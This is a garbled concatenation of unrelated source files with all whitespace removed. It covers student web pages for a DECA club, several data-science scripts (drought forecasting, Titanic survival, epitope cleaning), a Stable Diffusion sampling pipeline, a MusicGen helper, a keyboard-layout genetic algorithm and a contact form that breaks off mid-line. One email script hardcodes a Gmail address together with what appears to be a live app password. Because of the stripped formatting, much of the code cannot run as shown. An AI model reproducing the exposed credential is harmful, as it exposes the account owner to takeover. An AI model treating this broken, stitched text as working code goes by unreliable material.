/span><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><bdtclassName='statement-end-if-in-editor'><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'><bdtclassName='block-component'/></bdt></span></span></span></bdt></span></span></span><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'><bdtclassName='block-component'/></bdt></span></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='request'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>12.HOWCANYOUREVIEW,UPDATE,ORDELETETHEDATAWECOLLECTFROMYOU?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>Basedontheapplicablelawsofyourcountry,youmayhavetherighttorequestaccesstothepersonalinformationwecollectfromyou,changethatinformation,ordeleteit.{''}<bdtclassName='else-block'><bdtclassName='block-component'/>Torequesttoreview,update,ordeleteyourpersonalinformation,please{''}<bdtclassName='block-component'/>filloutandsubmita&nbsp;</bdt></span><spanstyle={{color:'rgb(0,58,250)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,58,250)',fontSize:15,}}><adata-custom-class='link'href='https://app.termly.io/notify/8e93c823-d220-4b99-b0fe-c1eaae946717'rel='noopenernoreferrer'target='_blank'>datasubjectaccessrequest</a></span></span></span><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt></span></span><spandata-custom-class='body_text'>.</span></div><styledangerouslySetInnerHTML={{__html:'\nul{\nlist-style-type:square;\n}\nul>li>ul{\nlist-style-type:circle;\n}\nul>li>ul>li>ul{\nlist-style-type:square;\n}\nolli{\nfont-family:Arial;\n}\n',}}/></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div><br/><br/><br/></div>);};exportdefaultPrivacy;importnumpyasnpimportpandasaspdimportmatplotlib.pyplotaspltimportseabornassnsimportwarningswarnings.filterwarnings('ignore')palette=sns.color_palette()fromsklearn.multioutputimportMultiOutputRegressorfromsklearn.metricsimportmean_squared_errorimportxgboostasxgbFIPS=6073df=pd.read_feather('src/Data/Optimized/drought.feather')df=df[df['FIPS']==FIPS]df['MapDate']=pd.to_datetime(df['MapDate'],format='%Y%m%d')df['drought']=0*df['None']+1*df['D0']+4*df['D1']+9*df['D2']+16*df['D3']+25*df['D4']df['severe']=df['D3']+df['D4']df.set_index('MapDate',inplace=True)df=df[['None','D0','D1','D2','D3','D4','severe','drought']]#segmentedbargraphfor1yearinSanDiego#df[df.index.year==2021][[iforiindf.columnsifi!='drought']].plot(kind='bar',stacked=True,figsize=(20,10),color=palette,title='DroughtSeverityinFIPS{}'.format(FIPS),width=1,edgecolor='black',linewidth=0.5)#plt.show()df['year']=df.index.yeardf['month']=df.index.monthdf['quarter']=df.index.quarterdf['dayofweek']=df.index.dayofweekdf['dayofyear']=df.index.dayofyearsns.boxplot(data=df,x='month',y='drought',palette='Blues')#plt.show()dependent='drought'df['last_week']=df[dependent].shift(1)df.dropna(inplace=True)independents=['year','month','quarter','dayofweek','dayofyear','last_week']train=df[df.index.year<2021]test=df[df.index.year>=2021]model=xgb.XGBRegressor(objective='reg:squarederror',n_estimators=1000,early_stopping_rounds=20,learning_rate=0.01)model.fit(train[independents],train[dependent],eval_set=[(test[independents],test[dependent])],verbose=100)feature_importance_df=pd.DataFrame(data=model.feature_importances_,index=model.feature_names_in_,columns=['importance'])#feature_importance_df.sort_values(by='importance',ascending=False,inplace=True)#feature_importance_df.plot(kind='bar',figsize=(20,10),color=palette,title='FeatureImportance',width=1,edgecolor='black',linewidth=0.5)#plt.show()test['prediction']=model.predict(test[independents])df=df.merge(test['prediction'],how='left',left_index=True,right_index=True)df['residual']=df[dependent]-df['prediction']mean=df['residual'].mean()std=df['residual'].std()ax=df[dependent].plot(figsize=(20,10),color=palette[0],title='DroughtSeverityinFIPS{}'.format(FIPS))df['prediction'].plot(ax=ax,color=palette[1],style='.')plt.legend(['Actual','Prediction'])ax.set_title('RawDataandPrediction')plt.show()print(std)importImagefrom'next/image';importLinkfrom'next/link';constBulkOrder=()=>{return(<divclassName='relativeh-[20em]w-fulloverflow-hidden'><ImageclassName='blur-smscale-[1.05]brightness-75'src='/wide.jpg'//replacewithyourimagepathalt='BackgroundImage'layout='fill'objectFit='cover'/>{/*<divclassName='absoluteinset-0flexjustify-centeritems-center'><h1className='w-3/5text-centertext-whitetext-5xlfont-bold'>Bulkandinstitutionalpricingavailableuponrequest</h1><divclassName='flexjustify-centeritems-centerpb-10'><Linkhref='https://docs.google.com/forms/u/1/d/e/1FAIpQLScOLfkmFsTZop_cca565deD4huYJtvuWMTzla1VEDlknbZl-w/viewform?vc=0&c=0&w=1&flr=0'className='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'>OrderNow</Link></div></div>*/}<divclassName='absoluteinset-0flexflex-coljustify-centeritems-center'><h1className='w-3/5text-centertext-whitetext-5xlfont-boldp-5'>Bulkandinstitutionalpricingavailableuponrequest</h1><divclassName='flexjustify-centeritems-centerm-5'><Linkhref='/contact'className='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'>ContactUs</Link></div></div></div>);};exportdefaultBulkOrder;importcursesimportdatetimeimportkeyboardimportsyssys.stdout=open('log.txt','w')defmain(stdscr):#donotwaitforinputwhencallinggetchstdscr.nodelay(100)start=datetime.datetime.now()pressed=datetime.datetime.now()whileTrue:c=stdscr.getch()ifc!=-1:start=datetime.datetime.now()stdscr.refresh()stdscr.move(0,0)else:end=datetime.datetime.now()print((end-start).total_seconds())#presscontrolbackspaceonceeverysecondif(end>startand(end-start).total_seconds()>5):if(datetime.datetime.now()-pressed).total_seconds()>1:pressed=datetime.datetime.now()keyboard.press_and_release('ctrl+backspace')if__name__=='__main__':curses.wrapper(main)importpandasaspdimportsmtplib,sslfromemail.mime.textimportMIMETextport=465#ForSSLpassword='autbyqcjzlktlgus'context=ssl.create_default_context()df=pd.read_csv('members.csv')subject='WelcometotheSuperJoeyFoundationClubatCCA'body="""Hieveryone!ThankyouforyourinterestintheSuperJoeyFoundation(SJF)Club.Asyoumayknow,weareacommunityserviceclubthataimstospreadchildhoodcancerawareness.Wehopetohelptheaffectedchildrenandtheirfamiliesthroughvolunteerworkandfundraisers.PleaseusethelinkbelowtojointheGoogleClassroom,wherewewillpostinformationaboutmeetingsandevents.Ilookforwardtoseeingyouguys!Best,NathanfromSJFInvitelink:https://classroom.google.com/c/NDAzNzA2NTU2NDAz?cjc=m6casizClasscode:m6casiz"""email='nathandai2000@gmail.com'recipients=df['Email'].tolist()message=MIMEText(body)message['Subject']=subjectmessage['From']=emailmessage['To']=','.join(recipients)withsmtplib.SMTP_SSL("smtp.gmail.com",port,context=context)asserver:server.login(email,password)server.sendmail(email,recipients,message.as_string())fromtransformersimportMusicgenForConditionalGeneration,AutoProcessorimportosimporttorchimportscipyimportnumpyasnpfromdotenvimportload_dotenvfromcontextimportcontextasCONTEXTfromopenaiimportOpenAIimportwarningswarnings.filterwarnings('ignore')load_dotenv()api_key=os.getenv('OPENAI_API_KEY')defget_music_prompt(section):prompt=f'Givenasectionofthetextfromthebook,generateaneffectiveSINGLE-LINEpromptthatwouldbeusedasinputtotheMusicGenmodel.Thisshouldgeneratemusicthat\'sgoodtoplayinthebackgroundastheimagesdisplay.\n\n'+sectionclient=OpenAI(api_key=api_key)completion=client.chat.completions.create(model='gpt-4o-mini',messages=[{'role':'system','content':CONTEXT},{'role':'user','content':prompt},],)returncompletion.choices[0].message.contentdefget_music(section,seconds):prompt=get_music_prompt(section)model=MusicgenForConditionalGeneration.from_pretrained('facebook/musicgen-small')#device='cuda'iftorch.cuda.is_available()else'cpu'device='cpu'model.to(device)processor=AutoProcessor.from_pretrained('facebook/musicgen-small')inputs=processor(text=[prompt],padding=True,return_tensors='pt',)audio_values=model.generate(**inputs.to(device),do_sample=True,guidance_scale=3,max_new_tokens=(256//5)*seconds)sampling_rate=model.config.audio_encoder.sampling_ratereturnaudio_values,sampling_rateimportLinkfrom"next/link";importImagefrom"next/image";exportdefaultfunctionAbout(){consthandle_mouse_move=(e)=>{letrect=e.target.getBoundingClientRect();letx=e.clientX-rect.left;lety=e.clientY-rect.top;e.target.style.setProperty('--x',`${x}px`);e.target.style.setProperty('--y',`${y}px`);}return(<div><divid="about"className="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><divclassName="mt-16flex"><divclassName="pr-4"><h1className="text-4xlfont-boldmb-4text-blue-500">AboutDECA</h1><pclassName="text-xltext-gray-700">DECApreparesemergingleadersandentrepreneursin{""}<spanclassName="bg-blue-100px-1">marketing,finance,hospitality,andmanagement</span>{""}inhighschoolsandcollegesaroundtheglobe.Theclubshapesthefuturebyprovidinghands-onexperienceswithbusinesssimulationsandreal-worldchallenges.JoinDECAtoigniteyourentrepreneurialspirit,forgeconnectionswithadynamicnetworkofpeers,andleapintoatransformativeeducationalexperience.</p><pclassName="text-xlmt-4text-gray-700">Herearesomeclusterstochoosefrom:</p></div></div><divclassName="pb-8pt-6bg-white"><divclassName="gridgrid-cols-1md:grid-cols-2gap-4">{/*Finance*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/finance","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-green-600">Finance</h2><pclassName="text-smtext-gray-700">Financeisfundamentalinteachinghowtomanageandauditfunds,focusingoninvestment,capitalplanning,andfinancialstrategies.</p></div></div>{/*HospitalityandTourism*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/hospitality-and-tourism","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-blue-600">Hospitality&Tourism</h2><pclassName="text-smtext-gray-700">Coveringthebreadthofcustomerserviceandtravelmanagement,thisclusterisaboutcreatingmemorableconsumerexperiences.</p></div></div>{/*Marketing*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/marketing","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-red-600">Marketing</h2><pclassName="text-smtext-gray-700">Delvingintotheartofcustomerattractionandretention,marketingisthecornerstoneofbusinessvisibilityandproductreach.</p></div></div>{/*PersonalFinancialLiteracy*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/personal-financial-literacy","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-lime-600">PersonalFinancialLiteracy</h2><pclassName="text-smtext-gray-700">Empoweringindividualswiththeknowledgetomakeinformedandeffectivedecisionsonfinancialresources.</p></div></div>{/*BusinessManagementandAdministration*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/business-management-administration","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-yellow-600">BusinessManagement&Administration</h2><pclassName="text-smtext-gray-700">Thisclusterfocusesontheessentialsoforganizationaloperations,strategicplanning,andresourceallocation.</p></div></div>{/*Entrepreneurship*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/finance","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-gray-600">Entrepreneurship</h2><pclassName="text-smtext-gray-700">Entrepreneurshipchampionsthecreationandgrowthofenterprises,instillingamindsetofinnovationandriskmanagement.</p></div></div></div><divclassName="mt-2text-leftpl-1text-sm"><ahref="https://www.deca.org/hs"className="font-semiboldtext-blue-400hover:underline"target="_blank"rel="noopenernoreferrer">Learnmorehere<spanaria-hidden="true">→</span></a></div></div><divclassName="pt-10lg:flexlg:items-startlg:justify-between">{/*TextSection*/}<divclassName="lg:w-1/2"><h1className="text-4xlfont-boldmb-4text-blue-500">WhyDECA?</h1><pclassName="text-lgtext-gray-500">DECAismorethanjustanextracurricular—it&apos;saglobalmovementthatpreparesstudentstobecomeleadersinadynamicworldofbusinessandentrepreneurship.Here’swhyyoushouldjoin:</p><ulclassName="mt-6list-disclist-insidetext-gray-500space-y-2"><li><strong>LeadershipDevelopment:</strong>Honeyourleadershipskillsthroughreal-worldchallengesandexecutiveroles.</li><li><strong>CareerPreparation:</strong>Gaininsightsintovariousbusinessindustrieswithhands-onexperiencesthatgobeyondtheclassroom.</li><li><strong>NetworkingOpportunities:</strong>Connectwithlike-mindedpeersandindustryprofessionalswhocanhelpyoualongyourcareerpath.</li><li><strong>CompetitiveEdge:</strong>Participateincompetitiveeventsthatbuildconfidenceandimpressivecredentialsforcollegeandjobapplications.</li><li><strong>EntrepreneurialSpirit:</strong>Igniteyourinnovativeideasandlearnhowtoturnthemintosuccessfulbusinessventures.</li><li><strong>TravelOpportunities:</strong>ExplorenewdestinationsandculturesthroughDECA&apos;sexclusiveconferencesandcompetitionsheldaroundtheglobe.</li><li><strong>CommunityImpact:</strong>MakeadifferencethroughcommunityserviceinitiativesandimpactprojectsthatDECAorganizes.</li></ul></div>{/*ImagesSection*/}<divclassName="lg:w-1/2lg:pl-4mt-8lg:mt-0">{/*Placeholderforimages-Replace'src'withyourimagepaths*/}<divclassName="gridgrid-cols-1sm:grid-cols-2gap-4"><Imagesrc="/image1.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/><Imagesrc="/image2.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/><Imagesrc="/image3.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/><Imagesrc="/image4.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/></div></div></div></div></div>);}importpandasaspdimportnumpyasnpfromsklearn.preprocessingimportLabelEncoderfromsklearn.model_selectionimporttrain_test_splitfromsklearn.linear_modelimportLogisticRegression#combinetrainandtestdatabecauseusuallythedatawillnotbesplit#df=pd.read_csv('data/train.csv').append(pd.read_csv('data/test.csv')).to_csv('data/titanic.csv',index=False)df=pd.read_csv('data/titanic.csv')#getsummaryofdataprint(df.info())#showfirst5rowsprint(df.head())le=LabelEncoder()#convertcategoricalstringvariablestointegersdf['Sex']=le.fit_transform(df['Sex'])#"female"and"male"df['Ticket']=le.fit_transform(df['Ticket'])#tickettypedf['Cabin']=le.fit_transform(df['Cabin'])#cabintypesdf['Embarked']=le.fit_transform(df['Embarked'])#portofembarkation#youcancreatenewvariablesfromexistingonesdf['FamilySize']=df['SibSp']+df['Parch']+1#numberoffamilymembers#fillmissingvalueswithmediandf['Age'].fillna(df['Age'].median(),inplace=True)df['Fare'].fillna(df['Fare'].median(),inplace=True)#dropdatapointif"survived"ismissingdf.dropna(subset=['Survived'],inplace=True)#droppassengernamebecauseitdoesnotaffectsurvivaldf.drop('Name',axis=1,inplace=True)#setindependentanddependvariablesindependents=df[[variableforvariableindf.columnsifvariable!='Survived']]dependent=df['Survived'].values#splittrainingandtestingdatawithtrain_test_split(80%training,20%testing)x_train,x_test,y_train,y_test=train_test_split(independents,dependent,test_size=0.2,random_state=42)#createlogisticregressionmodelmodel=LogisticRegression()#fitmodelandpredictmodel.fit(x_train,y_train)y_pred=model.predict(x_test)#getaccuracyofmodelprint('Accuracyoflogisticregressionclassifierontestset:{:.2f}'.format(model.score(x_test,y_test)))importpandasaspddf=pd.read_csv('data/approved.csv')importosimportpandasaspdfromtkinterimport*importsmtplib,sslfromemail.mime.textimportMIMETextimportpyperclipimportpicklefromgetpassimportgetpassimportscryptfromdatetimeimportdatetimewithopen('password.pkl','rb')asf:password=pickle.load(f)classGui(Frame):def__init__(self,master:Tk):super().__init__(master)self.port=465#ForSSLself.email=os.environ['email']self.password=os.environ['email_password']self.context=ssl.create_default_context()self.df=pd.read_csv('members.csv',comment='#')#self.df=pd.read_csv('test.csv')self.recipients=self.df['Email'].tolist()print(self.recipients)self.grid()self.root=masterself.subject=Text(self,undo=True,width=40,height=1)self.subject.grid()self.body=Text(self,undo=True,height=20,width=70,wrap=WORD)self.body.grid()self.send=Button(self,text="Send",command=self.send)self.send.grid()defsend(self):subject=self.subject.get(1.0,END).strip('\n')body=self.body.get(1.0,END).rstrip('\n')message=MIMEText(body)message['Subject']=subjectmessage['From']=self.emailmessage['To']=','.join(self.recipients)guess=scrypt.hash(getpass('Password:'),'randomsalt')if(guess==password):withsmtplib.SMTP_SSL('smtp.gmail.com',self.port,context=self.context)asserver:server.login(self.email,self.password)server.sendmail(self.email,self.recipients,message.as_string())print('Emailsent!')pyperclip.copy(body)self.root.destroy()withopen('log.txt','a')asf:f.write(datetime.now().strftime('%Y-%m-%d%H:%M:%S')+'\n')f.write(subject+'\n')f.write(body+'\n')else:print('Incorrectpassword!')root=Tk()root.title('SendEmails')gui=Gui(root)gui.mainloop()importPagefrom'@/components/Page';constBusinessManagementAndAdministration=()=>{return(<Pagedata_cluster='BusinessManagementandAdministration'cluster='businessManagementAdministration'/>);};exportdefaultBusinessManagementAndAdministration;importpathlibfromdataclassesimportasdict,dataclassfromenumimportEnumfromtypingimportOptionalfromomegaconfimportOmegaConffromsgm.inference.helpersimport(Img2ImgDiscretizationWrapper,do_img2img,do_sample)fromsgm.modules.diffusionmodules.samplingimport(DPMPP2MSampler,DPMPP2SAncestralSampler,EulerAncestralSampler,EulerEDMSampler,HeunEDMSampler,LinearMultistepSampler)fromsgm.utilimportload_model_from_configclassModelArchitecture(str,Enum):SD_2_1="stable-diffusion-v2-1"SD_2_1_768="stable-diffusion-v2-1-768"SDXL_V0_9_BASE="stable-diffusion-xl-v0-9-base"SDXL_V0_9_REFINER="stable-diffusion-xl-v0-9-refiner"SDXL_V1_BASE="stable-diffusion-xl-v1-base"SDXL_V1_REFINER="stable-diffusion-xl-v1-refiner"classSampler(str,Enum):EULER_EDM="EulerEDMSampler"HEUN_EDM="HeunEDMSampler"EULER_ANCESTRAL="EulerAncestralSampler"DPMPP2S_ANCESTRAL="DPMPP2SAncestralSampler"DPMPP2M="DPMPP2MSampler"LINEAR_MULTISTEP="LinearMultistepSampler"classDiscretization(str,Enum):LEGACY_DDPM="LegacyDDPMDiscretization"EDM="EDMDiscretization"classGuider(str,Enum):VANILLA="VanillaCFG"IDENTITY="IdentityGuider"classThresholder(str,Enum):NONE="None"@dataclassclassSamplingParams:width:int=1024height:int=1024steps:int=50sampler:Sampler=Sampler.DPMPP2Mdiscretization:Discretization=Discretization.LEGACY_DDPMguider:Guider=Guider.VANILLAthresholder:Thresholder=Thresholder.NONEscale:float=6.0aesthetic_score:float=5.0negative_aesthetic_score:float=5.0img2img_strength:float=1.0orig_width:int=1024orig_height:int=1024crop_coords_top:int=0crop_coords_left:int=0sigma_min:float=0.0292sigma_max:float=14.6146rho:float=3.0s_churn:float=0.0s_tmin:float=0.0s_tmax:float=999.0s_noise:float=1.0eta:float=1.0order:int=4@dataclassclassSamplingSpec:width:intheight:intchannels:intfactor:intis_legacy:boolconfig:strckpt:stris_guided:boolmodel_specs={ModelArchitecture.SD_2_1:SamplingSpec(height=512,width=512,channels=4,factor=8,is_legacy=True,config="sd_2_1.yaml",ckpt="v2-1_512-ema-pruned.safetensors",is_guided=True,),ModelArchitecture.SD_2_1_768:SamplingSpec(height=768,width=768,channels=4,factor=8,is_legacy=True,config="sd_2_1_768.yaml",ckpt="v2-1_768-ema-pruned.safetensors",is_guided=True,),ModelArchitecture.SDXL_V0_9_BASE:SamplingSpec(height=1024,width=1024,channels=4,factor=8,is_legacy=False,config="sd_xl_base.yaml",ckpt="sd_xl_base_0.9.safetensors",is_guided=True,),ModelArchitecture.SDXL_V0_9_REFINER:SamplingSpec(height=1024,width=1024,channels=4,factor=8,is_legacy=True,config="sd_xl_refiner.yaml",ckpt="sd_xl_refiner_0.9.safetensors",is_guided=True,),ModelArchitecture.SDXL_V1_BASE:SamplingSpec(height=1024,width=1024,channels=4,factor=8,is_legacy=False,config="sd_xl_base.yaml",ckpt="sd_xl_base_1.0.safetensors",is_guided=True,),ModelArchitecture.SDXL_V1_REFINER:SamplingSpec(height=1024,width=1024,channels=4,factor=8,is_legacy=True,config="sd_xl_refiner.yaml",ckpt="sd_xl_refiner_1.0.safetensors",is_guided=True,),}classSamplingPipeline:def__init__(self,model_id:ModelArchitecture,model_path="checkpoints",config_path="configs/inference",device="cuda",use_fp16=True,)->None:ifmodel_idnotinmodel_specs:raiseValueError(f"Model{model_id}notsupported")self.model_id=model_idself.specs=model_specs[self.model_id]self.config=str(pathlib.Path(config_path,self.specs.config))self.ckpt=str(pathlib.Path(model_path,self.specs.ckpt))self.device=deviceself.model=self._load_model(device=device,use_fp16=use_fp16)def_load_model(self,device="cuda",use_fp16=True):config=OmegaConf.load(self.config)model=load_model_from_config(config,self.ckpt)ifmodelisNone:raiseValueError(f"Model{self.model_id}couldnotbeloaded")model.to(device)ifuse_fp16:model.conditioner.half()model.model.half()returnmodeldeftext_to_image(self,params:SamplingParams,prompt:str,negative_prompt:str="",samples:int=1,return_latents:bool=False,):sampler=get_sampler_config(params)value_dict=asdict(params)value_dict["prompt"]=promptvalue_dict["negative_prompt"]=negative_promptvalue_dict["target_width"]=params.widthvalue_dict["target_height"]=params.heightreturndo_sample(self.model,sampler,value_dict,samples,params.height,params.width,self.specs.channels,self.specs.factor,force_uc_zero_embeddings=["txt"]ifnotself.specs.is_legacyelse[],return_latents=return_latents,filter=None,)defimage_to_image(self,params:SamplingParams,image,prompt:str,negative_prompt:str="",samples:int=1,return_latents:bool=False,):sampler=get_sampler_config(params)ifparams.img2img_strength<1.0:sampler.discretization=Img2ImgDiscretizationWrapper(sampler.discretization,strength=params.img2img_strength,)height,width=image.shape[2],image.shape[3]value_dict=asdict(params)value_dict["prompt"]=promptvalue_dict["negative_prompt"]=negative_promptvalue_dict["target_width"]=widthvalue_dict["target_height"]=heightreturndo_img2img(image,self.model,sampler,value_dict,samples,force_uc_zero_embeddings=["txt"]ifnotself.specs.is_legacyelse[],return_latents=return_latents,filter=None,)defrefiner(self,params:SamplingParams,image,prompt:str,negative_prompt:Optional[str]=None,samples:int=1,return_latents:bool=False,):sampler=get_sampler_config(params)value_dict={"orig_width":image.shape[3]*8,"orig_height":image.shape[2]*8,"target_width":image.shape[3]*8,"target_height":image.shape[2]*8,"prompt":prompt,"negative_prompt":negative_prompt,"crop_coords_top":0,"crop_coords_left":0,"aesthetic_score":6.0,"negative_aesthetic_score":2.5,}returndo_img2img(image,self.model,sampler,value_dict,samples,skip_encode=True,return_latents=return_latents,filter=None,)defget_guider_config(params:SamplingParams):ifparams.guider==Guider.IDENTITY:guider_config={"target":"sgm.modules.diffusionmodules.guiders.IdentityGuider"}elifparams.guider==Guider.VANILLA:scale=params.scalethresholder=params.thresholderifthresholder==Thresholder.NONE:dyn_thresh_config={"target":"sgm.modules.diffusionmodules.sampling_utils.NoDynamicThresholding"}else:raiseNotImplementedErrorguider_config={"target":"sgm.modules.diffusionmodules.guiders.VanillaCFG","params":{"scale":scale,"dyn_thresh_config":dyn_thresh_config},}else:raiseNotImplementedErrorreturnguider_configdefget_discretization_config(params:SamplingParams):ifparams.discretization==Discretization.LEGACY_DDPM:discretization_config={"target":"sgm.modules.diffusionmodules.discretizer.LegacyDDPMDiscretization",}elifparams.discretization==Discretization.EDM:discretization_config={"target":"sgm.modules.diffusionmodules.discretizer.EDMDiscretization","params":{"sigma_min":params.sigma_min,"sigma_max":params.sigma_max,"rho":params.rho,},}else:raiseValueError(f"unknowndiscretization{params.discretization}")returndiscretization_configdefget_sampler_config(params:SamplingParams):discretization_config=get_discretization_config(params)guider_config=get_guider_config(params)sampler=Noneifparams.sampler==Sampler.EULER_EDM:returnEulerEDMSampler(num_steps=params.steps,discretization_config=discretization_config,guider_config=guider_config,s_churn=params.s_churn,s_tmin=params.s_tmin,s_tmax=params.s_tmax,s_noise=params.s_noise,verbose=True,)ifparams.sampler==Sampler.HEUN_EDM:returnHeunEDMSampler(num_steps=params.steps,discretization_config=discretization_config,guider_config=guider_config,s_churn=params.s_churn,s_tmin=params.s_tmin,s_tmax=params.s_tmax,s_noise=params.s_noise,verbose=True,)ifparams.sampler==Sampler.EULER_ANCESTRAL:returnEulerAncestralSampler(num_steps=params.steps,discretization_config=discretization_config,guider_config=guider_config,eta=params.eta,s_noise=params.s_noise,verbose=True,)ifparams.sampler==Sampler.DPMPP2S_ANCESTRAL:returnDPMPP2SAncestralSampler(num_steps=params.steps,discretization_config=discretization_config,guider_config=guider_config,eta=params.eta,s_noise=params.s_noise,verbose=True,)ifparams.sampler==Sampler.DPMPP2M:returnDPMPP2MSampler(num_steps=params.steps,discretization_config=discretization_config,guider_config=guider_config,verbose=True,)ifparams.sampler==Sampler.LINEAR_MULTISTEP:returnLinearMultistepSampler(num_steps=params.steps,discretization_config=discretization_config,guider_config=guider_config,order=params.order,verbose=True,)raiseValueError(f"unknownsampler{params.sampler}!")importpandasaspdimportnumpyasnpimportmatplotlib.pyplotaspltdf=pd.read_csv('tcellmhc2.csv')df=df[['Epitope-IEDBIRI','Epitope-ObjectType','Epitope-Name','Epitope-SourceMolecule','Epitope-MoleculeParent','Epitope-SourceOrganism','EffectorCell-Name','MHCRestriction-Class','AntigenPresentingCell-Name','Assay-QualitativeMeasurement']]#filteroutrowswithbadeffectorcellnamesdf=df[(df['EffectorCell-Name'].notna())&~df['EffectorCell-Name'].str.contains('Unknown/Unspecified',na=False)&~df['EffectorCell-Name'].str.contains('Other',na=False)]df['Epitope-IEDBIRI']=df['Epitope-IEDBIRI'].apply(lambdax:x.split('/')[-1])#renamecolumnsdf.rename(columns={'Epitope-Name':'Sequence'},inplace=True)df.rename(columns={'Epitope-IEDBIRI':'ID'},inplace=True)#typesofpositiveandnegativedf['Assay-QualitativeMeasurement'].unique()#positive/negativetonumericaldf['target']=df['Assay-QualitativeMeasurement'].apply(lambdax:{'Negative':-1,'Positive-Low':0.9,'Positive-High':1.1,'Positive-Intermediate':1,'Positive':1}[x])#combineintouniqueepitopesdf=df.drop_duplicates(subset='ID').merge(df.groupby('ID')['target'].aggregate(lambdax:1ifx.sum()>0else-1ifx.sum()!=0elsenp.nan),left_on='ID',right_index=True,how='left').rename(columns={'target_y':'target'}).drop('target_x',axis=1).dropna(subset=['target'])df.to_feather('tcellmhc2.feather')importmatplotlib.pyplotaspltfromconcurrent.futuresimportProcessPoolExecutorfromkeyboardimportKeyboardSAMPLE_LENGTH=1000classEvolution:def__init__(self,population_size:int=100,mutation_rate:float=0.01,corpus:str=None,sample_length:int=SAMPLE_LENGTH):self.population_size=population_sizeself.mutation_rate=mutation_rateself.population=self.generate_population()self.corpus=corpusself.sample_length=sample_lengthdef__repr__(self):returnstr(self.best())def__len__(self):returnlen(self.population)defgenerate_population(self)->list:population=[]foriinrange(self.population_size):population.append(Keyboard())returnpopulationdefload_corpus(self,corpus:str)->None:self.corpus=corpusdefevolve(self)->None:self.population.sort(key=lambdakeyboard:keyboard.fitness(self.corpus,self.sample_length),reverse=False)self.population=self.population[:self.population_size//2]foriinrange(self.population_size//2):self.population.insert(0,self.population[i].crossover(self.population[i+1]))foriinrange(self.population_size):self.population[i].mutate(self.mutation_rate)returnself.best_fitness()defbest(self)->Keyboard:returnself.population[0]defbest_fitness(self)->float:returnself.population[0].fitness(self.corpus)defaverage_fitness(self)->float:returnsum([keyboard.fitness(self.corpus)forkeyboardinself.population])/self.population_sizedefevolve(evolution:Evolution)->None:evolution.evolve()if__name__=='__main__':withopen('words.txt')asf:words=f.read()evolution=Evolution(population_size=50,mutation_rate=0.01,corpus=words)fitness=[]print(evolution.best_fitness())forgenerationinrange(1000):evolution.evolve()fitness.append(evolution.best_fitness())print(generation,evolution.best_fitness())print(evolution.best_fitness())print(evolution.best())plt.plot(fitness)plt.show()import{useState}from'react';import{useFormik}from'formik';constContactForm=({onSubmit})=>{const[attemptedSubmit,setAttemptedSubmit]=useState(false);const[submitting,setSubmitting]=useState(false);constformik=useFormik({initialValues:{name:'',email:'',subject:'',body:'',},onSubmit:(values)=>{onSubmit(values);setSubmitting(true);},validate:(values)=>{consterrors={};//CheckifanyoftheinputsareemptyObject.keys(values).forEach((key)=>{if(!values[key]){errors[key]='Required';}});//CheckifemailisvalidconstemailRegex=/^[A-Z0-9._%+-]+@